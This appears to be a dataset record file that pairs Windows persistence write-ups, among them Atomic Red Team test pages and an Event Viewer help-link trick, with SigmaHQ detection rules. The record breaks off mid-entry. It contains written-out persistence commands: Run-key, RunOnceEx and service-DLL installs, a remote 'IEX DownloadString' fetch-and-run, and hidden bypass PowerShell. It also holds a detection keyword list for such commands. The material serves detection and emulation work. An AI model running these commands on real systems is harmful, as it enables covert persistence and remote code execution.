    "markdown": "# Post\n\nFeb 17, 2023\n\nPersistence via Event Viewer help link😅using \"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\\" \n\nAdd \"MicrosoftRedirectionProgram\" with your program and add \"ConfirmUrl\" to 1 to avoid prompt\n\n```image\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically showing the key path 'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\'. It lists several registry values related to a 'MicrosoftRedirectionProgram'. The table includes the 'Name', 'Type', and 'Data' columns, detailing entries such as 'MicrosoftRedirectionProgram', 'MicrosoftRedirectionProgramCommandLineParameters', and 'MicrosoftRedirectionURL', with associated data values like the path to 'calc.exe' and a URL.\nTranscription: |\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\n  \n  Name                                              Type             Data\n  -----------------------------------------------------------------------------------------------------------\n  (Default)                                         REG_SZ           (value not set)\n  MicrosoftRedirectionProgram                       REG_EXPAND_SZ    C:\\Windows\\System32\\calc.exe\n  MicrosoftRedirectionProgramCommandLineParameters  REG_SZ       \n  MicrosoftRedirectionURL                           REG_SZ           http://go.microsoft.com/fwlink/events.asp\n```\n\n```image\nDescription: The image displays a detailed log entry from an application, specifically from the SecurityCenter, with various attributes such as Log Name, Source, Event ID, Level, User, OpCode, and a link for more information about the event. The log entry indicates it is of informational level and includes an Event ID of 15. The 'More Information' section contains a link labeled 'Event Log Online Help,' which directs the user to further details about this specific event.\nTranscription: |\n  Log Name:         Application\n  Source:           SecurityCenter\n  Event ID:         15\n  Level:            Information\n  User:             N/A\n  OpCode:           Info\n  Logged:\n  Task Category:    None\n  Keywords:         Classic\n  Computer:       \n  More Information: Event Log Online Help\n```\n\n```image\nDescription: The image depicts a screenshot of a Windows Task Manager or a similar system monitoring tool, displaying two running processes: 'mmc.exe' with process ID 15668 and 'calc.exe' with process ID 65700. The interface shows icons next to each executable name, indicating the respective running applications.\nTranscription: |\n  mmc.exe (15668)\n  calc.exe (65700)\n```",
    "sigma_rule": {
      "title": "Potential Persistence Via Event Viewer Events.asp",
      "id": "a1e11042-a74a-46e6-b07c-c4ce8ecc239b",
      "status": "test",
      "description": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique",
      "references": [
        "https://twitter.com/nas_bench/status/1626648985824788480",
        "https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.InternetCommunicationManagement::EventViewer_DisableLinks",
        "https://www.hexacorn.com/blog/2019/02/15/beyond-good-ol-run-key-part-103/",
        "https://github.com/redcanaryco/atomic-red-team/blob/f296668303c29d3f4c07e42bdd2b28d8dd6625f9/atomics/T1112/T1112.md"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-02-17",
      "modified": "2023-03-05",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
            "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionURL"
          ]
        },
        "filter_default_redirect_program": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgram",
          "Details": "%%SystemRoot%%\\PCHealth\\HelpCtr\\Binaries\\HelpCtr.exe"
        },
        "filter_default_redirect_program_cli": {
          "Image|endswith": "C:\\WINDOWS\\system32\\svchost.exe",
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\\MicrosoftRedirectionProgramCommandLineParameters",
          "Details": "-url hcp://services/centers/support?topic=%%s"
        },
        "filter_url": {
          "Details": "http://go.microsoft.com/fwlink/events.asp"
        },
        "filter_cleaner": {
          "Details": "(Empty)"
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_event_viewer_events_asp.yml",
    "id": "997"
  },
  {
    "url": "https://persistence-info.github.io/Data/naturallanguage6.html",
    "markdown": "# persistence-info.github.io\n\n## Natural Language 6 DLLs\n\n### Location:\n\n```\nHKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\n```\n\n### Classification:\n\n| Criteria         | Value                |\n|------------------|----------------------|\n| Permissions      | Admin                |\n| Security context | System               |\n| Persistence type | Registry             |\n| Code type        | DLL                  |\n| Launch type      | Automatic            |\n| Impact           | Non-destructive [^1] |\n| OS Version       | All OS versions [^2] |\n| Dependencies     | OS only              |\n| Toolset          | Scriptable           |\n\n### Description:\n\n> C:\\WINDOWS\\system32\\SearchIndexer.exe process looks for the `DLLOverridePath` entries under the following locations (language may vary on non-English OS versions):\n> `HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\English_UK`\n> `HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\English_US`\n> `HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\Neutral`\n\n### References:\nhttps://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/\n\n### Remarks:\n\n[^1]: To be verified\n[^2]: To be verified",
    "sigma_rule": {
      "title": "Potential Persistence Via DLLPathOverride",
      "id": "a1b1fd53-9c4a-444c-bae0-34a330fc7aa8",
      "status": "test",
      "description": "Detects when an attacker adds a new \"DLLPathOverride\" value to the \"Natural Language\" key in order to achieve persistence which will get invoked by \"SearchIndexer.exe\" process",
      "references": [
        "https://persistence-info.github.io/Data/naturallanguage6.html",
        "https://www.hexacorn.com/blog/2018/12/30/beyond-good-ol-run-key-part-98/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_root": {
          "TargetObject|contains": "\\SYSTEM\\CurrentControlSet\\Control\\ContentIndex\\Language\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\StemmerDLLPathOverride",
            "\\WBDLLPathOverride",
            "\\StemmerClass",
            "\\WBreakerClass"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_persistence_natural_language.yml",
    "id": "1002"
  },
  {
    "url": "https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry",
    "markdown": "# T1547.001 - Registry Run Keys / Startup Folder\n\n## Description from ATT&CK\n\nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is `C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`. The startup folder path for all users is `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`.\n\nThe following run keys are created by default on Windows systems:\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\nRun keys may exist under multiple hives. (Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx` is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:\n```\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"\n```\n(Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders`\n- `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders`\n- `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders`\n\nThe following Registry keys can control automatic startup of services during boot:\n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce`\n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices`\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n- `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`\n- `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run`\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` and `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell` subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows` run when any user logs on.\n\nBy default, the multistring `BootExecute` value of the registry key `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager` is set to `autocheck autochk *`. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.\n\n## Atomic Tests\n\n- Atomic Test #1 - Reg Key Run\n- Atomic Test #2 - Reg Key RunOnce\n- Atomic Test #3 - PowerShell Registry RunOnce\n- Atomic Test #4 - Suspicious vbs file run from startup Folder\n- Atomic Test #5 - Suspicious jse file run from startup Folder\n- Atomic Test #6 - Suspicious bat file run from startup Folder\n- Atomic Test #7 - Add Executable Shortcut Link to User Startup Folder\n- Atomic Test #8 - Add persistance via Recycle bin\n- Atomic Test #9 - SystemBC Malware-as-a-Service Registry\n\n### Atomic Test #1 - Reg Key Run\n\nRun Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** e55be3fd-3521-4610-9d1a-e210e42dcf05\n\n#### Inputs:\n\n| Name               | Description  | Type | Default Value             |\n| ------------------ | ------------ | ---- | ------------------------- |\n| command_to_execute | Thing to Run | Path | C:\\Path\\AtomicRedTeam.exe |\n\n#### Attack Commands: Run with `command_prompt`!\n\n```\nREG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"\n```\n\n#### Cleanup Commands:\n\n```\nREG DELETE \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /f >nul 2>&1\n```\n\n### Atomic Test #2 - Reg Key RunOnce\n\nRunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 554cbd88-cde1-4b56-8168-0be552eed9eb\n\n#### Inputs:\n\n| Name             | Description  | Type | Default Value             |\n| ---------------- | ------------ | ---- | ------------------------- |\n| thing_to_execute | Thing to Run | Path | C:\\Path\\AtomicRedTeam.dll |\n\n#### Attack Commands: Run with `command_prompt`! Elevation Required (e.g. root or admin)\n\n```\nREG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n```\n\n#### Cleanup Commands:\n\n```\nREG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n```\n\n### Atomic Test #3 - PowerShell Registry RunOnce\n\nRunOnce Key Persistence via PowerShell\n\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** eb44f842-0457-4ddc-9b92-c4caa144ac42\n\n#### Inputs:\n\n| Name             | Description                    | Type | Default Value                                           |\n| ---------------- | ------------------------------ | ---- | ------------------------------------------------------- |\n| thing_to_execute | Thing to Run                   | Path | powershell.exe                                          |\n| reg_key_path     | Path to registry key to update | Path | HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce |\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\n$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\")\"'\n```\n\n#### Cleanup Commands:\n\n```\nRemove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n```\n\n### Atomic Test #4 - Suspicious vbs file run from startup Folder\n\nvbs files can be placed in and ran from the startup folder to maintain persistence. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" folder and will also run when the computer is restarted and the user logs in.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 2cb98256-625e-4da9-9d44-f2e5f90b8bd5\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n```\n\n### Atomic Test #5 - Suspicious jse file run from startup Folder\n\njse files can be placed in and ran from the startup folder to maintain persistence. Upon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" folder and will also run when the computer is restarted and the user logs in.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** dade9447-791e-4c8f-b04b-3a35855dfa06\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n```\n\n### Atomic Test #6 - Suspicious bat file run from startup Folder\n\nbat files can be placed in and executed from the startup folder to maintain persistence. Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" folder and will also run when the computer is restarted and the user logs in.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 5b6768e4-44d2-44f0-89da-a01d1430fd5e\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n```\n\n### Atomic Test #7 - Add Executable Shortcut Link to User Startup Folder\n\nAdds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 24e55612-85f6-4bd6-ae74-a73d02e3441d\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\n$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()\n```\n\n#### Cleanup Commands:\n\n```\nRemove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore\n```\n\n### Atomic Test #8 - Add persistance via Recycle bin\n\nAdd a persistence via Recycle bin vxunderground. User has to click on the recycle bin to launch the payload (here calc).\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** bda6a3d6-7aa7-4e89-908b-306772e9662f\n\n#### Attack Commands: Run with `command_prompt`!\n\n```\nreg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f\n```\n\n#### Cleanup Commands:\n\n```\nreg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f\n```\n\n### Atomic Test #9 - SystemBC Malware-as-a-Service Registry\n\nThis Atomic will create a registry key called socks5_powershell for persistence access SystemBC.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 9dc7767b-30c1-4cc4-b999-50cab5e27891\n\n#### Inputs:\n\n| Name          | Description                    | Type | Default Value                                                    |\n| ------------- | ------------------------------ | ---- | ---------------------------------------------------------------- |\n| reg_key_value | Thing to Run                   | Path | powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File |\n| reg_key_path  | Path to registry key to update | Path | HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run              |\n\n#### Attack Commands: Run with `powershell`!\n\n```\n$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n```\n\n#### Cleanup Commands:\n\n```\nRemove-ItemProperty -Path #{reg_key_path} -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n```",
    "sigma_rule": {
      "title": "Suspicious Powershell In Registry Run Keys",
      "id": "8d85cf08-bf97-4260-ba49-986a2a65129c",
      "status": "test",
      "description": "Detects potential PowerShell commands or code within registry run keys",
      "references": [
        "https://github.com/frack113/atomic-red-team/blob/a9051c38de8a5320b31c7039efcbd3b56cf2d65a/atomics/T1547.001/T1547.001.md#atomic-test-9---systembc-malware-as-a-service-registry",
        "https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html"
      ],
      "author": "frack113, Florian Roth (Nextron Systems)",
      "date": "2022-03-17",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "Details|contains": [
            "powershell",
            "pwsh ",
            "FromBase64String",
            ".DownloadFile(",
            ".DownloadString(",
            " -w hidden ",
            " -w 1 ",
            "-windowstyle hidden",
            "-window hidden",
            " -nop ",
            " -encodedcommand ",
            "-ExecutionPolicy Bypass",
            "Invoke-Expression",
            "IEX (",
            "Invoke-Command",
            "ICM -",
            "Invoke-WebRequest",
            "IWR ",
            " -noni ",
            " -noninteractive "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin or third party scripts. Baseline according to your environment"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_powershell_in_run_keys.yml",
    "id": "1008"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time",
    "markdown": "# T1543.003 - Windows Service\n\n## Description from ATT&CK\n\nAdversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. (Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as `sc.exe`), by directly modifying the Registry, or by interacting directly with the Windows API.\n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. (Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation. (Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).\n\n## Atomic Tests\n\n- Atomic Test #1 - Modify Fax service to run PowerShell\n- Atomic Test #2 - Service Installation CMD\n- Atomic Test #3 - Service Installation PowerShell\n- Atomic Test #4 - TinyTurla backdoor service w64time\n\n### Atomic Test #1 - Modify Fax service to run PowerShell\n\nThis test will temporarily modify the service Fax by changing the binPath to PowerShell and will then revert the binPath change, restoring Fax to its original state. Upon successful execution, cmd will modify the binpath for `Fax` to spawn PowerShell. PowerShell will then spawn.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** ed366cde-7d12-49df-a833-671904770b9f\n\n#### Attack Commands: Run with `command_prompt`! Elevation Required (e.g. root or admin)\n\n```\nsc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\"\nsc start Fax\n```\n\n#### Cleanup Commands:\n\n```\nsc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1\n```\n\n### Atomic Test #2 - Service Installation CMD\n\nDownload an executable from GitHub and start it as a service. Upon successful execution, PowerShell will download `AtomicService.exe` from GitHub. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 981e2942-e433-44e9-afc1-8c957a1496b6\n\n#### Inputs:\n\n| Name         | Description                               | Type  | Default Value                                      |\n|--------------|-------------------------------------------|-------|----------------------------------------------------|\n| binary_path  | Name of the service binary, include path.| Path  | PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe |\n| service_name | Name of the Service                       | String| AtomicTestService_CMD                             |\n\n#### Attack Commands: Run with `command_prompt`! Elevation Required (e.g. root or admin)\n\n```\nsc.exe create #{service_name} binPath= #{binary_path}\nsc.exe start #{service_name}\n```\n\n#### Cleanup Commands:\n\n```\nsc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1\n```\n\n### Atomic Test #3 - Service Installation PowerShell\n\nInstalls a local service via PowerShell. Upon successful execution, PowerShell will download `AtomicService.exe` from GitHub. PowerShell will then use `New-Service` and `Start-Service` to start the service. Results will be displayed.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 491a4af6-a521-4b74-b23b-f7b3f1ee9e77\n\n#### Inputs:\n\n| Name         | Description                               | Type  | Default Value                                      |\n|--------------|-------------------------------------------|-------|----------------------------------------------------|\n| binary_path  | Name of the service binary, include path.| Path  | PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe |\n| service_name | Name of the Service                       | String| AtomicTestService_PowerShell                      |\n\n#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)\n\n```\nNew-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n```\n\n#### Cleanup Commands:\n\n```\nStop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n```\n\n### Atomic Test #4 - TinyTurla backdoor service w64time\n\nIt's running DLL as a service to emulate the TinyTurla backdoor.\n\nRelated Talos Blog\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** ef0581fd-528e-4662-87bc-4c2affb86940\n\n#### Inputs:\n\n| Name         | Description                               | Type  | Default Value                                      |\n|--------------|-------------------------------------------|-------|----------------------------------------------------|\n| dllfilename  | It specifies DLL file to run as service   | string| $PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll   |\n\n#### Attack Commands: Run with `command_prompt`! Elevation Required (e.g. root or admin)\n\n```\ncopy #{dllfilename} %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time\n```\n\n#### Cleanup Commands:\n\n```\nsc stop W64Time\nsc.exe delete W64Time\ndel %systemroot%\\system32\\w64time.dll\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f\n```",
    "sigma_rule": {
      "title": "ServiceDll Hijack",
      "id": "612e47e9-8a59-43a6-b404-f48683f45bd6",
      "status": "test",
      "description": "Detects changes to the \"ServiceDLL\" value related to a service in the registry.\nThis is often used as a method of persistence.\n",
      "references": [
